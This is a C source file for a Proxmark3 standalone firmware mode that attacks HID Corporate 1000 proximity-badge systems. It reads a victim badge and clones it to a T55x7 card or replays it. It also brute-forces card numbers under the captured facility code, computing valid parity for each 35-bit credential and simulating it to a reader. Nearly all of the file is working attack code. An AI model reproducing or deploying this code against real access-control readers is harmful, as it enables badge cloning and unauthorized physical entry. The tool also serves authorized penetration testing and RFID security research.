//-----------------------------------------------------------------------------
// Copyright (C) Federico Dotta and Maurizio Agazzini, 2015
// Copyright (C) Proxmark3 contributors. See AUTHORS.md for details.
//
// This program is free software: you can redistribute it and/or modify
// it under the terms of the GNU General Public License as published by
// the Free Software Foundation, either version 3 of the License, or
// (at your option) any later version.
//
// This program is distributed in the hope that it will be useful,
// but WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
// GNU General Public License for more details.
//
// See LICENSE.txt for the text of the license.
//-----------------------------------------------------------------------------
// PROXMARK3 - HID CORPORATE 1000 BRUTEFORCER (STAND-ALONE MODE)
//
// The new stand-alone mode allows to execute a bruteforce on HID Corporate 1000 readers, by
// reading a specific badge and bruteforcing the Card Number (incrementing and decrementing it),
// mainteining the same Facility Code of the original badge.
//
// Based on an idea of Brad Antoniewicz of McAfee® Foundstone® Professional Services (ProxBrute),
// the stand-alone mode has been rewritten in order to overcome some limitations of ProxBrute firmware,
// that does not consider parity bits.
//
// https://github.com/federicodotta/proxmark3
//
//-----------------------------------------------------------------------------------
// main code for LF aka HID corporate brutefore by Federico Dotta & Maurizio Agazzini
//-----------------------------------------------------------------------------------
#include "standalone.h" // standalone definitions
#include "lf_hidbrute.h"

#include "proxmark3_arm.h"
#include "appmain.h"
#include "fpgaloader.h"
#include "util.h"
#include "dbprint.h"
#include "ticks.h"
#include "lfops.h"

#define OPTS 3

void ModInfo(void) {
    DbpString("  LF HID corporate 1000 bruteforce - aka Corporatebrute (Federico dotta & Maurizio Agazzini)");
}

// samy's sniff and repeat routine for LF
void RunMod(void) {
    StandAloneMode();
    Dbprintf(">>  LF HID corporate bruteforce a.k.a CorporateBrute Started  <<");
    FpgaDownloadAndGo(FPGA_BITSTREAM_LF);

    uint32_t high[OPTS], low[OPTS];
    int selected = 0;
    int playing = 0;
    int cardRead = 0;

    for (;;) {

        WDT_HIT();

        // exit from SamyRun,   send a usbcommand.
        if (data_available()) break;

        // Was our button held down or pressed?
        int button_pressed = BUTTON_HELD(280);
        if (button_pressed != BUTTON_HOLD)
            continue;

        // Button was held for a second, begin recording
        if (cardRead == 0) {
            LEDsoff();
            LED(selected + 1, 0);
            LED(LED_D, 0);

            WAIT_BUTTON_RELEASED();

            // record
            DbpString("[=] starting recording");

            lf_hid_watch(1, &high[selected], &low[selected], true);
            Dbprintf("[=] recorded %x %x %08x", selected, high[selected], low[selected]);

            LEDsoff();
            LED(selected + 1, 0);
            // Finished recording
            // If we were previously playing, set playing off
            // so next button push begins playing what we recorded
            playing = 0;
            cardRead = 1;
        } else if (button_pressed == BUTTON_HOLD && cardRead == 1) {
            LEDsoff();
            LED(selected + 1, 0);
            LED(LED_A, 0);

            // record
            Dbprintf("[=] cloning %x %x %08x", selected, high[selected], low[selected]);

            WAIT_BUTTON_RELEASED();

            CopyHIDtoT55x7(0, high[selected], low[selected], 0, false, false, true);
            Dbprintf("[=] cloned %x %x %08x", selected, high[selected], low[selected]);

            LEDsoff();
            LED(selected + 1, 0);
            // Finished recording

            // If we were previously playing, set playing off
            // so next button push begins playing what we recorded
            playing = 0;
            cardRead = 0;
        }

        // Change where to record (or begin playing)
        else if (button_pressed != BUTTON_NO_CLICK) {
            // Next option if we were previously playing
            if (playing)
                selected = (selected + 1) % OPTS;

            playing = !playing;

            LEDsoff();
            LED(selected + 1, 0);

            // Begin transmitting
            if (playing && selected != 2) {

                LED(LED_B, 0);
                DbpString("[=] playing");

                WAIT_BUTTON_RELEASED();

                Dbprintf("[=] %x %x %08x", selected, high[selected], low[selected]);
                CmdHIDsimTAG(0, high[selected], low[selected], 0, 0);
                DbpString("[=] done playing");

                if (BUTTON_HELD(1000) == BUTTON_HOLD)
                    goto out;

                /* We pressed a button so ignore it here with a delay */
                SpinDelay(300);

                // when done, we're done playing, move to next option
                selected = (selected + 1) % OPTS;
                playing = !playing;
                LEDsoff();
                LED(selected + 1, 0);
            } else if (playing && selected == 2) {
                // Now it work only with HID Corporate 1000 (35bit), but is easily extensible to others RFID.
                // It is necessary only to calculate the correct parity.

                // Brute force code
                // Check if the badge is an HID Corporate 1000
                if ((high[selected] & 0xFFFFFFF8) != 0x28) {
                    DbpString("[-] Card is not a HID Corporate 1000. Skipping bruteforce.");
                    continue;
                }

                LED(LED_B, 0);
                DbpString("[=] entering bruteforce mode");

                WAIT_BUTTON_RELEASED();

                // Calculate Facility Code and Card Number from high and low
                uint32_t cardnum = (low[selected] >> 1) & 0xFFFFF;
                uint32_t fc = ((high[selected] & 1) << 11) | (low[selected] >> 21);
                uint32_t original_cardnum = cardnum;

                Dbprintf("[=] HID brute - starting decrementing card number");

                while (cardnum > 0) {

                    // Needed for exiting from proxbrute when button is pressed
                    if (BUTTON_PRESS()) {
                        if (BUTTON_HELD(1000) == BUTTON_HOLD) {
                            goto out;
                        } else {
                            while (BUTTON_PRESS()) {
                                WDT_HIT();
                            }
                            break;
                        }
                    }

                    // Decrement Card Number
                    cardnum--;

                    // Calculate checksum of HID Corporate 1000 and set card number and facility code in high and low variables
                    hid_corporate_1000_calculate_checksum_and_set(&high[selected], &low[selected], cardnum, fc);

                    // Print actual code to brute
                    Dbprintf("[=] TAG ID: %x%08x (%d) - FC: %u - Card: %u", high[selected], low[selected], (low[selected] >> 1) & 0xFFFF, fc, cardnum);

                    CmdHIDsimTAGEx(0, high[selected], low[selected], 0, 1, 50000);
                }

                cardnum = original_cardnum;

                Dbprintf("[=] HID brute - starting incrementing card number");

                while (cardnum <= 0xFFFFF) {

                    // Needed for exiting from proxbrute when button is pressed
                    if (BUTTON_PRESS()) {
                        if (BUTTON_HELD(1000) == BUTTON_HOLD) {
                            goto out;
                        } else {
                            while (BUTTON_PRESS()) { WDT_HIT(); }
                            break;
                        }
                    }

                    // Decrement Card Number
                    cardnum++;

                    // Calculate checksum of HID Corporate 1000 and set card number and facility code in high and low variables
                    hid_corporate_1000_calculate_checksum_and_set(&high[selected], &low[selected], cardnum, fc);

                    // Print actual code to brute
                    Dbprintf("[=] TAG ID: %x%08x (%d) - FC: %u - Card: %u", high[selected], low[selected], (low[selected] >> 1) & 0xFFFF, fc, cardnum);

                    CmdHIDsimTAGEx(0, high[selected], low[selected], 0, 1, 50000);
                }

                DbpString("[=] done bruteforcing");
                if (BUTTON_HELD(1000) == BUTTON_HOLD)
                    goto out;

                /* We pressed a button so ignore it here with a delay */
                SpinDelay(300);

                // when done, we're done playing, move to next option
                selected = (selected + 1) % OPTS;
                playing = !playing;
                LEDsoff();
                LED(selected + 1, 0);

            } else {
                WAIT_BUTTON_RELEASED();
            }
        }
    }

out:
    SpinErr((LED_A | LED_B | LED_C | LED_D), 250, 5);
    DbpString("[=] exiting");
    LEDsoff();
}

// Function that calculate next value for the brutforce of HID corporate 1000
void hid_corporate_1000_calculate_checksum_and_set(uint32_t *high, uint32_t *low, uint32_t cardnum, uint32_t fc) {

    uint32_t new_high = 0;
    uint32_t new_low = 0;

    // Calculate new high and low base value from card number and facility code, without parity
    new_low = (fc << 21) | (cardnum << 1);
    new_high = 0x28 | ((fc >> 11) & 1); // 0x28 is 101000

    int n_ones;
    uint32_t i;

    // Calculating and setting parity bit 34
    // Select only bit used for parity bit 34 in low number (10110110110110110110110110110110)
    uint32_t parity_bit_34_low = new_low & 0xB6DB6DB6;
    n_ones = 0;
    // Calculate number of ones in low number
    for (i = 1; i != 0; i <<= 1) {
        if (parity_bit_34_low & i)
            n_ones++;
    }
    // Calculate number of ones in high number
    if (new_high & 1)
        n_ones++;

    // Set parity bit (Even parity)
    if (n_ones % 2)
        new_high = new_high | 0x2;

    // Calculating and setting parity bit 1
    // Select only bit used for parity bit 1 in low number (01101101101101101101101101101100)
    uint32_t parity_bit_1_low = new_low & 0x6DB6DB6C;
    n_ones = 0;

    // Calculate number of ones in low number
    for (i = 1; i != 0; i <<= 1) {
        if (parity_bit_1_low & i)
            n_ones++;
    }
    // Calculate number of ones in high number
    if (new_high & 0x1)
        n_ones++;

    if (new_high & 0x2)
        n_ones++;

    // Set parity bit (Odd parity)
    if (!(n_ones % 2))
        new_low = new_low | 0x1;

    // Calculating and setting parity bit 35
    n_ones = 0;
    // Calculate number of ones in low number (all bit of low, bitmask unnecessary)
    for (i = 1; i != 0; i <<= 1) {
        if (new_low & i)
            n_ones++;
    }
    // Calculate number of ones in high number
    if (new_high & 0x1)
        n_ones++;

    if (new_high & 0x2)
        n_ones++;

    // Set parity bit (Odd parity)
    if (!(n_ones % 2))
        new_high = new_high | 0x4;

    // Setting new calculated values
    *low = new_low;
    *high = new_high;
}

// prepare a waveform pattern in the buffer based on the ID given then
// simulate a HID tag until the button is pressed or after #numcycles cycles
// Used to bruteforce HID in standalone mode.

